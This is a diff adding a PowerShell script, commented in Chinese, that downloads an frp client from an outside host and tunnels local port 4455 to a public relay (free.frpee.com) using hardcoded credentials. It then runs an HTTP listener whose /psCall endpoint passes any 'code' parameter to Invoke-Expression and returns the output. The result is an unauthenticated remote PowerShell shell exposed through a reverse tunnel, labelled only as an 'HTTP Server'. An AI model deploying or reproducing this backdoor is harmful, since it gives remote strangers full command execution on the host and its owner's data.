@@ -1,0 +1,160 @@
+$cd=$env:temp; cd $cd; [Environment]::CurrentDirectory = $cd
+$host.UI.RawUI.WindowSize = New-Object Management.Automation.Host.Size ($host.UI.RawUI.WindowSize.Width, 12)
+######################################################
+$s="11436访问4455 -->> free.frpee.com:11436"; $s; $host.UI.RawUI.WindowTitle = $s
+$server = "free.frpee.com"; $user = "19117"; $token = "18823"; $remotePort = 11436; $localPort = 4455; #852029091@qq.com
+###################################################### 获取工具软件路径
+function getToolPath
+{
+	param (
+		[string]$filePath,
+		[string]$urlDown,
+		[string]$fileMD5
+	)
+	
+	$shouldDownload = $true;
+	
+	# 如果文件存在，先检查 MD5 值
+	if (Test-Path $filePath)
+	{
+		$computedMD5 = (Get-FileHash $filePath -Algorithm MD5).Hash
+		if ($computedMD5 -eq $fileMD5)
+		{
+			$shouldDownload = $false # 无需下载
+		}
+	}
+	
+	# 如果文件不存在或 MD5 校验失败，则下载文件
+	if ($shouldDownload)
+	{
+		# 检查文件所在目录是否存在，如果不存在则先创建
+		$directory = [System.IO.Path]::GetDirectoryName($filePath)
+		if (-Not (Test-Path $directory)) { New-Item -Path $directory -ItemType Directory > $Null }
+		
+		(New-Object Net.WebClient).DownloadFile($urlDown, $filePath) #下载文件
+		
+		# 下载完成后再次检查 MD5 值
+		$computedMD5 = (Get-FileHash $filePath -Algorithm MD5).Hash
+		if ($computedMD5 -ne $fileMD5) { Throw }
+	}
+	
+	# 执行解压
+	if ($filePath -match '\.zip$')
+	{
+		$outputDirectory = [System.IO.Path]::GetDirectoryName($filePath)
+		Expand-Archive -Path $filePath -DestinationPath $outputDirectory -Force
+		del $filePath -for
+		$filePath = $filePath -replace '\.zip$', '.exe'
+	}
+	return $filePath
+}
+
+$one = "http://www.jyhmedia.com/OneManager/bbwbxyz"
+getToolPath -filePath $cd\frpc.exe -urlDown "$one/SOFT/WIN/RunTime/Frpc/Frpc.exe" -fileMD5 '6552385E0220CEB7581BB566DED505CD'
+
+$ip = (Get-NetIPAddress | ? {$_.AddressFamily -eq 'IPv4' -and $_.AddressState -eq 'Preferred' -and $_.InterfaceAlias -ne 'Loopback Pseudo-Interface 1'}).IPAddress
+$toml = @"
+serverAddr = `"$server`"
+serverPort = 7000
+user = `"$user`"
+metadatas.password = `"$token`"
+#metadatas.token = `"$token`"
+[[proxies]]
+name = `"HTTP Server $ip`"
+type = "tcp"
+localIP = `"$ip`"
+localPort = $localPort
+remotePort = $remotePort
+transport.useEncryption = true
+transport.useCompression = true
+"@ | Set-Content -Path "frpc.toml"
+
+#& .\frpc.exe -c frpc.toml
+start ".\frpc.exe" "-c frpc.toml" -NoNewWindow
+
+###################################################################
+# 定义监听地址和端口
+$listener = New-Object System.Net.HttpListener
+$listener.Prefixes.Add("http://+:4455/")  # 在4455端口监听所有IP
+
+# 查询字符串解析函数
+function Parse-QueryString($queryString) {
+    $result = @{}
+    $pairs = $queryString.TrimStart('?').Split('&')
+    foreach ($pair in $pairs) {
+        $key, $value = $pair.Split('=')
+        $result[$key] = [System.Net.WebUtility]::UrlDecode($value)
+    }
+    return $result
+}
+
+try {
+    # 尝试启动监听器
+    $listener.Start()
+    Write-Host "HTTP 服务已启动，监听端口 4455..." -ForegroundColor Green
+
+    while ($true) {
+        # 等待客户端请求
+        Write-Host "等待请求中..."
+        $context = $listener.GetContext()  # 获取请求上下文
+        $request = $context.Request         # 获取请求对象
+        $response = $context.Response       # 获取响应对象
+
+        # 打印收到的请求信息
+        Write-Host "收到请求：" -ForegroundColor Cyan
+        Write-Host "方法: $($request.HttpMethod)"
+        Write-Host "URL: $($request.Url)"
+        Write-Host "Headers: $($request.Headers)"
+
+        # 解析查询参数
+        $queryString = Parse-QueryString($request.Url.Query)
+        $code = $queryString["code"]
+
+        if ($request.Url.AbsolutePath -eq "/psCall" -and $code) {
+            Write-Host "检测到目标请求，开始执行代码..." -ForegroundColor Yellow
+
+            # 捕获代码执行结果
+            try {
+                $executionResult = Invoke-Expression $code
+                $executionOutput = $executionResult | Out-String
+
+                # 构建成功的 JSON 响应
+                $jsonResponse = @{
+                    code = 200
+                    msg  = [System.Net.WebUtility]::UrlEncode($executionOutput.Trim())
+                } | ConvertTo-Json -Depth 10
+            } catch {
+                # 构建失败的 JSON 响应
+                $errorMessage = $_.Exception.Message
+                $jsonResponse = @{
+                    code = 500
+                    msg  = [System.Net.WebUtility]::UrlEncode($errorMessage)
+                } | ConvertTo-Json -Depth 10
+            }
+        } else {
+            # 非目标请求返回 404
+            $jsonResponse = @{
+                code = 404
+                msg  = "Invalid request"
+            } | ConvertTo-Json -Depth 10
+        }
+
+        # 将 JSON 响应转换为字节
+        $responseBytes = [System.Text.Encoding]::UTF8.GetBytes($jsonResponse)
+        $response.ContentType = "application/json"
+        $response.ContentLength64 = $responseBytes.Length
+
+        # 写入响应
+        $response.OutputStream.Write($responseBytes, 0, $responseBytes.Length)
+
+        # 关闭响应流
+        $response.OutputStream.Close()
+    }
+} catch {
+    Write-Host "发生错误: $_" -ForegroundColor Red
+} finally {
+    if ($listener -and $listener.IsListening) {
+        $listener.Stop()
+    }
+    Write-Host "HTTP 服务已停止" -ForegroundColor Yellow
+}
